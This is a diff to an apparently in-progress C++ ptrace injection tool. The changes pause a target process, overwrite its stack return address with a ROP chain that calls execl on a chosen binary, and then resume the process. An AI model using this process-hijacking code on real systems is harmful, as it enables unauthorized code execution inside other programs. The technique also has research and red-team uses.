@@ -13,14 +13,14 @@
 //
 // TODO: add option for custom libc.so or auto detection
 // TODO: move argument checking to main instead of in helpers
+// TODO: replace shellcode functions with lambdas
 //
-
-
 
 #include <sys/ptrace.h>
 #include <sys/user.h>
 #include <sys/wait.h>
 #include <unistd.h>
+#include <signal.h>
 #include <cstdlib>
 #include <cstring>
 #include <utility>
@@ -82,6 +82,7 @@ void ptrace_mem_write(pid_t pid, uintptr_t dest, void *data, size_t len) {
             memcpy(&curr, data + i, sizeof(long));
         }
         else {
+            // write NULLs
             curr = 0;
         }
         ptrace(PTRACE_POKETEXT, pid, dest + i, curr);
@@ -200,26 +201,29 @@ int main(int argc, char *argv[]) {
     }
     else {
         // send pause signal
+        kill(target_pid, SIGSTOP);
 
         // get stack ret addr and write needed variables after ret
         uintptr_t stack_ret_addr = get_stack_ret_addr(target_pid);
+
+        // overwrite stack addr with address of rop chain
         procmem_write(target_pid, stack_ret_addr, rop_chain_addr, sizeof(rop_chain_addr));
 
         // write rop chain to exec mapped section
         // note: need to use lambda to write this bullshit
-        // rop chain
-        // - target_bin
+        // rop chain:
         // - mov &target_bin, %rdi
         // - mov 0, %rsi
         // - mov 0, %rdx
         // - call execl_addr
+        // - target_bin + NULL
         ropchain chain;
-        // chain.push();
+        chain.push(target_bin, strlen(target_bin) + 1);
+        chain.push(NULL, 1);
         procmem_write_ropchain(target_pid, rop_chain_addr, chain);
 
-        // overwrite stack addr with address of rop chain
-
-        // cont
+        // send cont sig
+        kill(target_pid, SIGCONT);
 
         return 0;
     }
